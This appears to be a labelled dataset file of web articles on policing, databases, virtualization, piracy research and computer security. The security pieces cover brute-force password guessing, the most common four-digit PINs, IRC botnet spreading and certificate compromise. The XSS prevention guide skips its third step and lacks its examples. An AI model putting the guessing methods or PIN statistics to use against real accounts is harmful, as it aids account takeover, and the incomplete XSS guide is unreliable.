subways down from 170,000 per day to the point where it fell so low that the MTA stopped tracking it. Malcolm Gladwell wrote about this \"tipping point\" phenomenon in his book of the same name.\nBut I also learned something that stuck with me: many fare beaters tend to have character flaws. One in seven was wanted on a warrant or probation and parole violation. One in twenty-one carried an illegal weapon.\nAnd that got the cops going: an arrest for fare beating wasn't just about writing a paper summons anymore. Now it was about making felony collars. And when fare beating went away, crime fell, and so, too, did the sense of disorder. And when it did, ridership returned. The MTA coffers began to fill again; the capital plan could go forward. That was the idea.\nTake care of the small stuff, shake the tree for information, and you head off the big stuff. Take a fare beater or a low-level drug dealer off the street, and whatever criminal behavior he had in mind goes away with him. You can control behavior to such an extent that you can change it. That was the broken windows theory in practice.1\n1 The \"broken windows\" theory was articulated by George L. Kelling and James Q. Wilson in the March 1982 issue of The Atlantic: \"Broken Windows: The Police and Neighborhood Policing.\"\nExcerpted from Collaborate or Perish! by William J. Bratton and Zachary Tumin. Copyright © 2012 by William Bratton. Excerpted by permission of Crown Business, a division of Random House, Inc. All rights reserved. No part of this excerpt may be reproduced or reprinted without permission in writing from the publisher.", "label": 1}
{"text": "Working with encrypted data in SQL Server\nEncryption plays an important role in protecting data and preventing intrusion. In this session we will look at the various places and methods of Encryption that exist inside SQL Server.\nFirst, we will look at the types of encryption available in SQL Server. These include Encryption by Pass Phrase, by Symmetric key, by Asymmetric key, by Certificate, by one-way-Hash and signing. During this we will be looking at the strength of the encryption and possible attacks such as whole-value substitution, brute force and Rainbow table attack. Lastly, we will look at how SQL encryption differs from .Net (or other programming environments) and the pros and cons of each.\nFollowing on from that will be a look at how the encryption hierarchy works to provide an impressive level of key protection. We will be answering questions like what is a master key, how it is different to the service master key, and what does the service master key do.\nWe will be looking at System level encryption for system features such as TDS and credentials storage and services such as SSRS, SSIS, and DQS. How and why do these services use encryption? These features and services use SQL encryption inherently to protect the most sensitive of configuration\nFinally, we will look at ways of preparing for disaster recovery with encrypted data. Encrypted\ndata is nothing more than random binary data with the keys and algorithms to decrypt it. Thus, there is a critical need for effective key management and understanding of what is necessary to recover encrypted data in the event of a disaster.\nSorry, there are no downloads available for this session.\nI’m a talented multi-skilled IT professional with advanced skills in SQL server 2005/08 and 2012. I have many years experience in SQL design, administration, server consolidation and migration in large scale organisations. I have completed MCITP in database administration and development. My belief is that data is the critical element of an organisation and that a database must be effective, efficient and secure. I am an expert in information system holding a BSc(Hons) in computing and informatics. I currently work for an international organisation as their head DBA. My next aim is completion of MCSM and to discuss a topic at SQLBits.\nThe video is not available to view online.\n- Session Files Explorer\nThe network name cannot be found.", "label": 1}
{"text": "Tightly wound: A cross-section of a new cable design shows superconducting ribbons wound around a core of copper wires.\nSource: “Home Alone: Co-Residency Detection in the Cloud via Side-Channel Analysis”\nYinqian Zhang et al.\nProceedings of the IEEE Symposium on Security and Privacy, May 2011\nResults: A prototype system allows companies that use cloud computing services to confirm that their data is safe from others using the same service provider. It can detect with 80 percent accuracy the presence of unauthorized processing on the same server; the rate of false positives is 1 percent. The system will notice both attackers and inappropriate data sharing.\nWhy it matters: Cloud computing makes it possible to access generic processing and storage resources over the Internet. But security concerns have made many companies and organizations hesitant to use these services. Data could be stored on hardware shared with competitors, they fear, or it could even be vulnerable to malicious software actively trying to steal information. Some customers, such as NASA, have demanded that cloud providers physically isolate their data from that of other users. The problem is that until now, it’s been almost impossible to verify that this is being done.\nMethods: In the past, researchers have found that attackers can steal data about a virtual machine’s activities—even sensitive information such as passwords—by watching subtle clues such as how it uses shared system resources, including the server’s temporary storage system. The researchers coöpted this principle to make it work for defense. They trained a legitimate virtual machine to watch a server’s cache for telltale signs of hostile virtual machines on the same server. The technique requires no modification to existing cloud technologies and no action from the cloud provider.\nNext Steps: The researchers are expanding the prototype to create a complete system that can run on a commercial cloud service, such as Amazon Web Services.\nLow-Literacy Web Search\nA form of the Web for people who can’t read aims to help poor countries\nSource: “Spoken Web: Creation, Navigation and Searching of Voicesites”\nSheetal Agarwal et al.\n2011 International Conference on Intelligent User Interfaces (IUI), February 13-16, 2011, Palo Alto, California\nResults: A search engine developed by IBM researchers makes it possible to find and access information on a spoken version of the World Wide Web. A test of the interface by 40 farmers in the Indian state of Gujarat showed that it was easy to use.\nWhy it matters: More than one billion people worldwide are illiterate, most of them in poor nations. This poses a more fundamental barrier to Web use than the cost of computers and network access. For four years, a team at IBM Research India has operated a system called the Spoken Web that uses telephone numbers in place of Web addresses so that users can dial in to “upload” or listen to spoken information. Several thousand people worldwide use the service to share information such as local crop prices. However, until now there hasn’t been an efficient way to search and sort through that information.\nMethods: IBM’s search engine relies on speech recognition to understand the word a person is searching for—a pesticide name, for example—and to find mentions of that word on the Spoken Web. Like a conventional search engine, it can rapidly generate a list of many results, but a user cannot skim the list to choose the best result, as is possible on the text Web. Instead, the system tells the user how many results it found and suggests ways to filter that list—for example, by the name of the person who recorded a particular piece of information. This step is repeated until there are five or fewer results. That short list is read out to the user, who chooses which result to “browse” to.\nNext Steps: The researchers plan to roll out the system to all users of the Spoken Web. They are also working to improve the quality of the speech recognition software involved. Most access to the Spoken Web is in Indian languages that makers of such software have not focused on before.", "label": 1}
{"text": "If you have an account on Hotmail, Yahoo!, or Excite, it's vulnerable to hackers.\n[And yet, a few years later, Winkler says you have absolutely nothing to worry about from hackers.]\nFree email services are a common feature on portal sites, but some of them have serious security vulnerabilities-- specifically, Yahoo! Mail, Excite Mail, and Hotmail\nFirst, these three services allow an unlimited number of log-on attempts. This means that malicious Internet users can perform password guessing and \"brute force\" password attacks against accounts on those systems. (After three failed log-in attempts, Yahoo! does ask the supposed user if they require help. However, additional log-in attempts are not prevented.)\nSecond, the user is not notified when a number of failed log-in attempts have occurred. If a password attack had been attempted against a user account, the user has no way of knowing.\nThese vulnerabilities affect a lot of Internet surfers. Free email services are extremely popular as a Web-based alternative to regular Internet service provider accounts. The ability to access mail from any Web browser and a certain level of Internet anonymity are great advantages that these accounts offer. Security, however, is a distinct disadvantage.\nThe problems probably are not limited to Yahoo!, Excite, and Hotmail. To test whether a particulare site is vulnerable to a brute-force attack, simply try entering incorrect passwords. If the system allows more than ten invalid password entries without locking out the account, then it probably allows an unlimited number of password-cracking attempts.\n[Probably? In his vast years of pen-testing, he hasn't run into a single case of an application or service being vulnerable to brute forcing weaknesses?]\nPassword crackers attempt to obtain an account's password by exhaustively guessing word and number combinations. For example, an attacker may use a dictionary as the source of words. More sophisticated password crackers will use word-and-number combinations, such as star99. The most time-consuming technique is to try every possible combination of letters, numbers, and special characters. Such attacks can easily be automated. Password cracking is an extremely common hacker technique.\n[Password Cracking is not the same as remotely brute force attacking an application like Yahoo or Hotmail. Very few hackers rely on brute forcing as it takes an incredibly long time to complete, regardless of resources. Password cracking relies on having a hashed value of the password and then exhausting all possible combinations.]\nTo prevent brute-force attacks, a security function should lock an account after an excessive number of failed log-in attempts, typically three to five. Once an account is locked, the user should be emailed about the failed log-in attempts and told to contact the system administrators, who will verify the user's identity. While this would cause a temporary interruption of service, it would prevent the account from being compromised. This is a basic security practice that is built into most computer operating systems.\nAdmittedly, these vulnerabilities are extremely basic. I was not expecting them to exist on all the systems I examined. I take their presence as an indication that security was not a crucial step in designing these systems.\nWhile the sites all state that users should choose their passwords well, they do not account for attacks that can compromise even the best passwords. This leaves users, who number in the thousands or even hundreds of thousands (industry numbers measure accounts, not the number of users), vulnerable to someone with even trivial programming and hacking skills.\nWhile no attacks have been reported, it is likely that they were attempted. It is also a given that they will be attempted and successful unless action is taken.\nI contacted Yahoo! and Excite press liaisons about this issue and received no official reply. Hotmail could not be reached by telephone, and email messages to its technical support groups were not returned.\nWhat You Can Do\nUsers can't currently do much to prevent their accounts from being compromised. However, until the services redesign their log-in process, surfers should be aware that an attacker may be able to access email messages and other information stored on the system. Attackers may also be able to assume your identity online. Accordingly, you should delete all sensitive messages and not use the accounts to receive sensitive messages.\nThe best thing you can do is contact your service, let it know how important security is to you, and tell it that you expect it to correct this problem. You can also recommend that it implement the secure socket layer (SSL) protocol for log ins and accessing your information. SSL encrypts the data that you send and receive from a website and has no discernible effect on your system. This protects your information from being read by people using sniffers to read information on the Internet as it is being sent.\n[User's can do one thing that is immensely helpful actually; pick a strong password that is not likely to be brute forced. You know, like you recommend shortly after saying user's can't do much. Further, SSL does not prevent the attacks described in this article.]\nPicking a Good Password\nAlthough no one is exempt from a brute-force attack, taking a few precautions can make it significantly harder for others to guess your password.\nMany people pick passwords that they can easily remember. Unfortunately, that can translate into being easily guessed if someone has minimal knowledge about you. When you choose a password, make sure that it is unusual and not based on personal information or the website itself. For example, I'd imagine that hundreds of people have some variation of the word Yahoo for logging into Yahoo! Mail.\nOne scary aspect of free email accounts is the measures put in place to help users remember their passwords. Most Web portals realize that their visitors subscribe to many portals or visit the site infrequently, and they have a feature to help people who have forgotten their passwords. Basically, the service allows you to create clues that will remind you of your password. Users can even use biographical information for a password.\nFor example, the system will ask you what city you were born in. If you answer the question correctly, the service allows you to change your password.\nHow hard is it to figure out where someone was born, or the name of their dog? In many cases, people might give this information out online in the course of casual exchanges of information. In response to my recent article on You've Got Mail, a woman described her experience being stalked by a former acquaintance. She said he was a brilliant hacker because he broke into her email account.\nWhen I asked her if her stalker could have gained enough information to guess her password or access question, she indicated that it would have been easy for him to know the answer to the question.\nMy recommendation is that you think of an unusual and memorable answer for a typical question. Let's say you chose the question \"What city were you born in?\" Answer with the state as opposed to the city. Only you would know to try this unique answering approach.\nFinally, when you send out email, try not to divulge private information. If you use a signature file at the end of your email message, remember not to include personal information.", "label": 1}
{"text": "Most of you have probably never heard of Comodo, yet this medium-sized security company is directly responsible for last week’s Apple security updates for Mac OS X and iOS. In fact, Comodo is responsible for security updates issued for every major Web browser and consumer operating system over the past few weeks.\nHow does one relatively unknown security company trigger a rash of updates in so many different products? The answer reveals more about flaws in the chain of trust of the Internet than any particular product weaknesses.\nAmong other aspects of their business, Comodo is a provider of the digital certificates that power the encrypted SSL/TLS (generally shortened to just SSL) connections we use to protect our communications over the Internet. Whenever you see the little lock icon in the corner of your browser you are using SSL. It means your connection is encrypted, and that, supposedly, the Web site you are visiting really is what it says it is. This technology is used to secure your connections to everything from MobileMe to your bank. SSL is also used to protect other connections and protocols — including secure email and certain VPNs.\nSSL relies on digital certificates — special files that use different aspects of cryptography, including cryptographic signatures — to build a chain of trust. Certificates are used to sign other certificates in a highly secure fashion that identifies every member of the entire chain, allowing your computer to decide who to trust. These chains always lead back to a root certificate authority (CA). All Web browsers, and most operating systems, include the public certificates for CAs trusted by the browser or OS manufacturer, which enables your computer to know who to trust without you having to make the decision yourself.\nNormally this system works well. Our banks and other online providers purchase SSL certificates from the CAs, which validate the identity of the company and issue the certificate (a file) signed by the CA. The customer company then installs that file on their Web server to enable secure connections. People who don’t want to pay for a signed certificate (which can be expensive) can generate their own, but since such self-signed certificates aren’t signed by a root CA, anyone visiting the site will see a warning from their browser and have to make a manual exception to accept it. (Very large companies often set up their own CA and install their certificate on employee systems to skip this warning).\nBut there are three cases where the system can break down. In the first, someone creates a fake certificate with the name of a real site and tricks the user into accepting it. The second problem is if the certificate authority issues a certificate for the wrong company. We’ve seen this happen a few times for companies like Microsoft, and the Electronic Frontier Foundation’s SSL Observatory project, which tracks the over 650 CAs, found numerous certificates issued for names like “localhost” and “exchange” that could be used by an attacker in what’s called a “man in the middle attack.” It’s also suspected that less-than-friendly foreign governments issue certificates for known sites to intercept citizen and visitor traffic.\nThe third and final case is what Comodo experienced on 15 March 2011. An attacker, believed to be a student from Iran, compromised a Comodo reseller and issued valid certificates for seven major domains including Microsoft, Yahoo, Skype, and Mozilla.\nComodo responded immediately, adding those certificates to its revocation list, and Mozilla and Microsoft released updates for Firefox and Windows on 22 March and 23 March 2011. Technically, all browsers and operating systems will check for revoked certificates, but since this activity can be blocked (and is often disabled), the only certain way to remove the certificates is by blacklisting them using software updates. Apple followed with their updates on 15 April 2011 (see below), and rolled in some additional small changes.\nAs well as SSL works, incidents like this highlight the weaknesses in the system (covered in depth in this excellent Economist article by our own Glenn Fleishman). With so many certificate authorities, including some with poor business processes, it is nearly impossible to assure that our chain of trust is actually trustworthy. While this shouldn’t change your online practices today, it’s worth understanding the system and keeping a skeptical eye in case you notice something unusual.\nMeanwhile, here’s additional information about Apple’s updates.\niOS 4.3.2 -- The most significant of the updates, iOS 4.3.2 goes beyond the security problems to fix an issue that occasionally caused blank or frozen video during a FaceTime call, and also addresses a problem that prevented some international users from connecting to 3G networks on the 3G iPad. On the security side, along with blacklisting the spurious updates, iOS 4.3.2 includes fixes for a problem with library randomization, a pair of WebKit vulnerabilities, and a Quick Look vulnerability.\nSecurity Update 2011-002 -- This update, available for Mac OS X 10.6.7 Snow Leopard (4.43 MB), 10.5.8 Leopard (241.35 MB), and 10.5.8 Leopard Server (473.19 MB), includes only the fix necessary to blacklist the spurious certificates.\niOS 4.2.7 for iPhone (CDMA) -- This update, available only via iTunes, updates iOS 4.2.5 or 4.2.6 running on the CDMA-based Verizon iPhone 4 to address not just the spurious certificates, but also iOS 4.3.2’s WebKit and Quick Look vulnerabilities.\nSafari 5.0.5 -- As you might expect, Safari 5.0.5 mimics the changes in iOS, blacklisting the spurious certificates and rolling in the WebKit fixes, which presumably also patch WebKit for all other applications that use it (ranging from iTunes to Google Chrome). Safari 5.0.5 requires either Mac OS X 10.5.8 or Mac OS X 10.6.5 or later and is a 46.83 MB download.", "label": 1}
{"text": "What's the difference between stealing a CD from a music store and ripping off music online? The music industry and law enforcers say that there is none: Theft is theft, whether it's physical or digital.\nCollege students participating in a newly published study, however, said that while they were unlikely to shoplift and viewed that behavior as immoral, they were not exactly motivated to follow the laws governing digital music piracy -- a finding that underscores the difficulties of enforcing such laws and to find new ways to discourage the theft of all types of digital content.\nIn the study by University of Nebraska-Lincoln researchers, nearly 200 undergraduates were asked to react to a hypothetical fellow student either shoplifting a CD or illegally downloading one. Students who reacted to the shoplifting scenario endorsed various motivations to obey the law -- morality, influence from family and friends, fear of getting caught and an inherent obligation to follow the law -- significantly more than those reacting to the downloading scenario.\n\"We examined theoretical explanations for law-abiding behavior that have been traditionally used to account for compliance, and found weaker support for these explanations when it comes to digital piracy,\" said Twila Wingrove, the study's lead author. \"The results suggest that students perceive shoplifting and digital piracy differently, despite the fact that they are both forms of theft.\"\nThe study's data was collected in the mid-2000s, during highly publicized efforts by the music industry to deter piracy that included filing lawsuits against some offenders. In fact, fear of penalties was the traditional compliance factor that was most strongly related to participants' reporting reduced downloading behavior.\nStill, while hearing about the lawsuits had some effect on students' motivations to obey downloading laws, many still saw little chance of being caught and perceived that downloading and file sharing wasn't as serious as stealing music from a store.\nWhy? The very nature of music piracy is likely the largest obstacle to curbing it, the authors say. There is no risk of physical harm to a victim and no physical object as a target -- making it easier to deduce that digital music theft is harming no one at all. Also, there is widespread social support for the behavior within the internet community and on college campuses.\nThe attitude could bleed into other industries that have digitally downloadable content, such as motion pictures, video games and online news outlets that have recently put up paywalls, the research suggests. The study hints similar enforcement problems as the music industry's could set in.\n\"Interestingly, while respect for legal authorities is generally found to be significantly related to compliance with the law, this relationship did not seem to exist for college students and music. It wouldn't be a stretch to speculate that a similar disconnect might exist with regard to other digitally available forms of media, like television and movies. This is an avenue that should be explored in future research,\" she said.\nVicky Weisz, co-author of the study, agreed: \"We have much to learn about the rapidly changing digital world and the views of younger generations about the legitimacy of the constraints on that world.\"\nA deterrence strategy with threats of penalties and fines, as the Recording Industry Association of America undertook in early 2004 with the lawsuits, may work as a short-term fix. Whether that fear of punishment can be sustained over time, however, remains to be seen.\n\"We studied college students who grew up with internet access at a time when the internet was considered an access point for free information and media and when there were no convenient, popular methods to pay for online content,\" Wingrove said. \"As more industries begin to restrict content and to streamline the purchase of content, perhaps these attitudes will shift and people will have lower expectations of entitlement, but that is a process that will likely happen very slowly.\"\nWingrove, who is now at Appalachian State University, conducted the research while at UNL along with Angela Korpas of the Department of Psychology and Weisz, of UNL's Center on Children, Families, and the Law. The study appears in the journal Psychology, Crime and Law.\nAAAS and EurekAlert! are not responsible for the accuracy of news releases posted to EurekAlert! by contributing institutions or for the use of any information through the EurekAlert! system.", "label": 1}
{"text": "I/O Virtualization: When, Not If\nAugust 05, 2010\nI/O Virtualization (IOV) is an I/O card-sharing technology that lets multiple servers share multiple cards across a single, high-speed cable segment. The general purpose of IOV is to make it easier to share bandwidth among servers in a rack. The cards to be shared are placed in a gateway, and the servers connect to that gateway. Cards are typically shareable on a per-port basis. For example, a quad-port Ethernet card could be assigned to four different servers. The ports or cards can be quickly assigned and re-assigned to the connecting servers, providing some hot-swap like functionality to PCIe. IOV is still in its infancy, but it is destined to become a standard component of a data center architecture.\nThere will be cost savings associated with IOV. For example, a single pair of cards in a server can perform multiple I/O functions and can replace several single-function cards per server. It also eliminates the need for a redundant card of each type in each server. Instead, a single card can act as a \"hot spare\" held within the I/O gateway and be assigned to the hosts if another card inside the gateway fails. Things get interesting when a single port on a card can be shared across multiple hosts. To accomplish this, it may mean adopting Single Root I/O Virtualization (SR-IOV), a specification from the PCI-SIG, the industry group that manages the PCI standard. Vendors may also create their own cards that can be shared. The result is that a 10GB Ethernet card or 16GB Fibre Channel card will be shareable across multiple servers, with each getting chunks of that bandwidth. The challenge for SR-IOV is the time it will take to come to market. Vendors that develop their own cards may have these capabilities sooner.\nI believe IOV becomes a \"when not if\" technology because of the value it brings to the virtualized environment. Today, an I/O card in a virtual host is managed by the hypervisor. Unless you limit your VMs per physical host to the number of physical NIC ports available on the host, the hypervisor has to create virtual NICs. As a result, the hypervisor has to be involved in each I/O to understand what VM the I/O is intended for. This consumes host resources and limits the potential of getting full bandwidth from the NIC. With IOV, the inspection process can be offloaded from the hypervisor. It allows the cards to be virtualized and present themselves to the hypervisor as individual NICs that can be hard-assigned to specific VMs, minimizing hypervisor interaction and maximizing resources.\nIOV will also give the IT administrator the ability to add and remove I/O resources to servers as needed, a term we call Infrastructure Bursting. With per-host virtual machine densities reaching the twenties and thirties, planning the I/O needs for those systems becomes more challenging. Predicting peak load times may be impossible. IOV lets you dynamically add I/O resources to physical hosts and VMs within them when peak times occur, and then re-assign them elsewhere when the need passes, basically bursting the infrastructure for a short time. All it takes is a spare card in the gateway to be assigned when I/O becomes an issue in a particular server.\nThe ability to offload the virtualization task from the host and to dynamically add temporary bandwidth to a host makes IOV a compelling technology, and something that will likely become prevalent in larger data centers. The inhibitors to IOV are the connection styles and the amount of disruption, like any other infrastructure, that it may cause. We'll cover those inhibitors in a future entry. For more on IOV, see this entry.", "label": 1}
{"text": "What risks will I run by not implementing an application-layer firewall? Am I leaving myself wide open by not using an application-layer firewall?\nApplication-layer filtering firewalls are required to protect networks from modern attackers because attackers now focus their efforts on developing exploits against weaknesses in the services they attack. Since the application layer is the least protected layer, attackers use a variety of application-specific exploits and target the known and unknown weaknesses in server services in order to take control. For example: Stateful inspection firewalls just don't detect worms that are injected as a malicious code within the protocols, since they only look at network-layer packet headers. Worms require a deep inspection for identifying the signatures and the stream to that particular session to analyze the content. An application-layer filtering firewall is able to examine the application-layer commands and data to determine whether the content or commands being sent to a server on the corporate network fall outside the bounds of valid connection attempts.\nAnother good example of the application layer-risk is buffer overflow attacks against server services. This is one of the most common methods attackers use to disable a network service and potentially take control of the server running the network service. For instance, to initiate an attack, the attacker can craft a packet containing oversized SMTP commands and then send them to an SMTP mail server. If the mail server implementation has a known or unknown buffer overflow weakness, the attack could disable or take over the server. An application-layer firewall is capable of filtering the SMTP traffic and blocks the buffer overflow attempt at the firewall itself, preventing the attack to get past the firewall.\nThis was first published in November 2007", "label": 1}
{"text": "These days, home PCs are a desirable target for attackers. Most of these systems run Microsoft Windows and often are not properly patched or secured behind a firewall, leaving them vulnerable to attack. In addition to these direct attacks, indirect attacks against programs the victim uses are steadily increasing. Examples of these indirect attacks include malicious HTML-files that exploit vulnerabilities in Microsoft's Internet Explorer or attacks using malware in Peer-to-Peer networks. Especially machines with broadband connection that are always on are a valuable target for attackers. As broadband connections increase, so to do the number of potential victims of attacks. Crackers benefit from this situation and use it for their own advantage. With automated techniques they scan specific network ranges of the Internet searching for vulnerable systems with known weaknesses. Attackers often target Class B networks (\n/16 in CIDR notation) or smaller net-ranges. Once these attackers have compromised a machine, they install a so called IRC bot - also called zombie or drone - on it.\nInternet Relay Chat (IRC) is a form of real-time communication over the Internet. It is mainly designed for group (one-to-many) communication in discussion forums called channels, but also allows one-to-one communication.\nMore information about IRC can be found on Wikipedia.\nWe have identified many different versions of IRC-based bots (in the following we use the term bot) with varying degrees of sophistication and implemented commands, but all have something in common. The bot joins a specific IRC channel on an IRC server and waits there for further commands. This allows an attacker to remotely control this bot and use it for fun and also for profit. Attackers even go a step further and bring different bots together. Such a structure, consisting of many compromised machines which can be managed from an IRC channel, is called a botnet. IRC is not the best solution since the communication between bots and their controllers is rather bloated, a simpler communication protocol would suffice. But IRC offers several advantages: IRC Servers are freely available and are easy to set up, and many attackers have years of IRC communication experience.\nDue to their immense size - botnets can consist of several ten thousand compromised machines - botnets pose serious threats. Distributed denial-of-service (DDoS) attacks are one such threat. Even a relatively small botnet with only 1000 bots can cause a great deal of damage. These 1000 bots have a combined bandwidth (1000 home PCs with an average upstream of 128KBit/s can offer more than 100MBit/s) that is probably higher than the Internet connection of most corporate systems. In addition, the IP distribution of the bots makes ingress filter construction, maintenance, and deployment difficult. In addition, incident response is hampered by the large number of separate organizations involved. Another use for botnets is stealing sensitive information or identity theft: Searching some thousands home PCs for password.txt, or sniffing their traffic, can be effective.\nThe spreading mechanisms used by bots is a leading cause for \"background noise\" on the Internet, especially on TCP ports 445 and 135. In this context, the term spreading describes the propagation methods used by the bots. These malware scan large network ranges for new vulnerable computers and infect them, thus acting similar to a worm or virus. An analysis of the traffic captured by the German Honeynet Project shows that most traffic targets the ports used for resource sharing on machines running all versions of Microsoft's Windows operating system:\nThe traffic on these four ports cause more then 80 percent of the whole traffic captured. Further research with tools such as\nNmap, Xprobe2 and p0f reveal that machines running Windows XP and 2000 represent the most affected software versions. Clearly most of the activity on the ports listed above is caused by systems with Windows XP (often running Service Pack 1), followed by systems with Windows 2000. Far behind, systems running Windows 2003 or Windows 95/98 follow.\nBut what are the real causes of these malicious packets? Who and what is responsible for them? And can we do something to prevent them? In this paper we want to show the background of this traffic and further elaborate the causes. We show how attackers use IRC bots to control and build networks of compromised machines (botnet) to further enhance the effectiveness of their work. We use classical GenII-Honeynets with some minor modifications to learn some key information, for example the IP address of a botnet server or IRC channel name and password. This information allows us to connect to the botnet and observe all the commands issued by the attacker.\nAt times we are even able to monitor their communication and thus learn more about their motives and social behavior. In addition, we give some statistics on the quantitative information we have learned through monitoring of more than one hundred botnets during the last few months. Several examples of captured activities by attackers substantiate our presentation.\nFor this research, a Honeynet of only three machines was used. One dial-in host within the network of the German ISP T-Online, one dial-in within the network of the German ISP NetCologne and one machine deployed at RWTH Aachen University. The hosts in the network of the university runs an unpatched version of Windows 2000 and is located behind a Honeywall. The dial-in hosts run a newly developed software called\nmwcollectd2, designed to capture malware. We monitor the botnet activity with our own IRC client called\ndrone. Both are discussed in greater detail later in this paper.\nAlmost all Bots use a tiny collection of exploits to spread further. Since the Bots are constantly attempting to compromise more machines, they generate noticeable traffic within a network. Normally bots try to exploit well-known vulnerabilities. Beside from the ports used for resource sharing as listed above, bots often use vulnerability-specific ports. Examples of these ports include:\nThe vulnerabilities behind some of these exploits can be found with the help of a search on Microsoft's Security bulletins (sample):", "label": 1}
{"text": "The concept of virtualization has been around for some time. Virtualization is really just the abstraction of an actual entity or construct into logical representations of those entities or constructs. Most of the time, the term “virtualization” is tied to server virtualization — a technology made popular by VMware, Microsoft, Xen, etc.\nHowever, while server virtualization is the hot trend in enterprise IT, storage virtualization is making significant strides in functionality; people just do not realize it yet.\nStorage virtualization involves abstracting the physical data storage process to more logical constructs inside of the storage device. Let’s take a quick look at how storage virtualization is taking shape:\nTraditional storage: Single disk\n- A data consumer issues read/write requests. The disk controller either reads or writes to specific locations on disk.\nRAID: Multiple disk\n- This is one of the most widely used implementations for storage virtualization. While it may not seem like it, the data storage environment is indeed virtualized.\n- Multiple disks are aggregated into a storage structure to increase storage, increase resiliency, or both.\n- A data consumer issues read/write requests. The storage controller determines which storage devices contain the data, compute the entire request from multiple devices (potentially), and return it to the consumer. The data is no longer on a single device.\nLUN: Multiple logical storage devices\n- This takes RAID to the next level.\n- A group of disks are placed into an array structure. The disks are aggregated in some fashion (typically in RAID levels). However, a subset of the allocated capacity is divided and presented to a data consumer as a LUN. The LUN is a logical storage device for a consumer.\nStorage pooling: Spanning multiple drive array types\n- Multiple tiers of storage are created based on storage device profile (capacity and performance), typically a RAID group or other physical storage enclosures.\n- The storage device creates a higher-level structure, called a pool, of which the various performance tiers are members. The pool structure is presented to the data consumer at the LUN level.\n- The storage controller stores metadata about which data blocks reside in which tier, and their location inside the tier.\nData migration: Moving data around\n- Building on top of storage pools, storage controllers (via metadata) are able to determine the data access patterns for individual blocks of data.\n- Frequently used data is moved to the highest performing tier of disk while less frequently accessed data is moved to the lower performing tier of disk.\n- This migration occurs without the knowledge of the data consumer. The consumer sees the storage as a LUN and does not know (or care) about what happens as long as the data is available.\nDeduplication: Sharing common data\n- Many data structures share the same data patterns. Microsoft Word files share the same framework across all files, regardless of content. Microsoft Windows servers all have common files. Conceptually, deduplication addresses the idea of “Why store multiple copies of the same data over and over again?”\n- Based on the type of algorithm, the storage device processes existing data to determine if any duplicate data exists.\n- In the event of duplicate data, the storage controller creates pointers to the common data. Common blocks are replaced by a pointer, and the overall storage footprint is reduced.\nThin provisioning: Not allocating storage at creation time\n- This functionality operates under the theory that space may be allocated but never fully used, resulting in unused space that cannot be used by anyone else.\n- The storage controller receives a request to allocate space for a data consumer. The controller creates the basic framework that represents a LUN. However, internal to the storage device, the space is not allocated. Rather, the LUN is basically authorized to consume a specific amount of disk space.\n- As the disk consumer continues to use storage space, the LUN grows on the storage controller until the LUN size is completely allocated. Until the LUN is fully utilized, the unused space can be used for other purposes.\n- This may result in over-allocation of storage, though, and needs monitoring.\nStorage Virtualization Continues to Advance\nAs you can see, from traditional file storage to thin provisioning, storage virtualization has played a major role in advancing how we use our storage infrastructure and reap the benefits from our investments.\nStorage virtualization techniques and technology continue to advance. Object storage, pNFS, and server virtualization functional offload will become more commonplace as new storage device models and feature sets are developed and introduced.\nStorage virtualization is not the process of storing virtual machine disks. Rather, it is a beast of its own, and continues to provide valuable benefits.", "label": 1}
{"text": "Checking PIN passwords from databases that were released by hackers in the past, Nick Berry found that the 20 most popular ones compose more than 25 percent of all passwords in existence.\nBy far, the most popular password is 1234. “It’s staggering how popular this password appears to be. Utterly staggering at the lack of imagination,” Berry writes. “Nearly 11 percent of the 3.4 million passwords are 1234!”\nThe next most popular combination is 1111, clocking in at about 6 percent. Passwords made of repeating numbers like this are overwhelmingly popular. And in a real move of maturity, 6969 charts at number 10 on the list.\nThe least commonly used password? 8068, clocking in with a frequency of 0.000744 percent. Of course, just because this is currently the least used PIN, it doesn’t mean it’s a smart idea to rush out and change your numbers to that combination. In fact, that bit of knowledge comes with a warning from Berry.\n“Now that we’ve learned that, historically, 8068 is (was?) the least commonly used password 4-digit PIN, please don’t go out and change yours to this!” he wrote. “Hackers can read too! They will also be promoting 8068 up their attempt trees in order to catch people who read this (or similar) articles.”\nBy pushing a number up their \"attempt trees,\" Berry means hackers would give it more priority in the list of numbers they use to try and crack the password.\nWhat is the take-home from all of this data? For one, never use 1234 as your PIN. But more generally, if your PIN is a series of easily guessable numbers, it’s probably a bad idea to use that flimsy piece of security to protect your banking information. If your number shows up in the top 20, it might be wise to change it.\nBerry also chides developers who make data like this easily accessible to hackers. All of the information used in Berry’s study was found in unencrypted databases, meaning that once a developer or hacker has access to the database, no further methods are required to see any and all of the passwords available. That’s just bad security.\nSee much, much more raw data on PIM passwords at Data Genetics.", "label": 1}
{"text": "XSS Prevention in Four Simple Steps\nPreventing Cross Site Scripting (XSS) attacks is a daunting task for developers. In short, XSS attacks are an injection attack in which data that is structurally significant in the current context changes the intended semantics and/or functionality. While there are great resources online that walk you through prevention techniques (one of the best security resources is The Open Web Application Security Project, or OWASP, website), it’s easy to get confused when you try to implement all of the necessary safeguards.\nBelow, I’ve outlined four simple steps that significantly lower the risk of XSS attacks against your website. By being a bit more restrictive, we can simplify our approach to preventing XSS in the most common use cases. These steps must all be implemented together, but there’s only four of them, so c’mon, you can do it\nStep 1: Escape Output Provided by Users\nIf you want to include data within a page that’s been provided by users, escape the output. And, in this simplified list, we’re going to stick with one simple escape operation: HTML encode any <, >, &, ‘, “. For example, PHP provides the htmlspecialchars() function to accomplish this common task.\nStep 2: Always Use XHTML\nRead through OWASP’s XSS prevention strategies, and it becomes apparent that protecting against injection requires much more effort if you use unquoted attributes in your HTML. In contrast, in quoted attributes, escaping data becomes the same process needed to escape data for content within tags, the escape operation we already outlined above. That’s because the only troublemaker in terms of sneaking in structurally significant content within the context of a quoted attribute is the closing quote.\nObviously, your markup doesn’t have to be XHTML in order to contain quoted attributes. However, shooting for and validating against XHTML makes it easy to test if all of the attributes are quoted.\nStep 4: URL-Encode URL Query String Parameters\nIf user data is output within a URL parameter of a link query string, make sure to URL-encode the data. Again, using PHP as example, you can simply use the urlencode() function. Now, let’s be clear on this and work through a couple examples, as I’ve seen much confusion concerning this particular point.\nThe following example outputs user data that must be URL-encoded because it is used as a value in the query string.\nMust Not URL-Encode\nThe following example outputs the user-supplied data for the entire URL. In this case, the user data should be escaped with the standard escape function (HTML encode any <, >, &, ‘, “), not URL-encoded. URL-encoding this example would lead to malformed links.\nThat said, these four steps provide a an approach to defending against XSS that is easily remembered and implemented, covers a broad range of typical website scenarios, and serves as a solid start for developers who are learning how to address basic security concerns.", "label": 1}
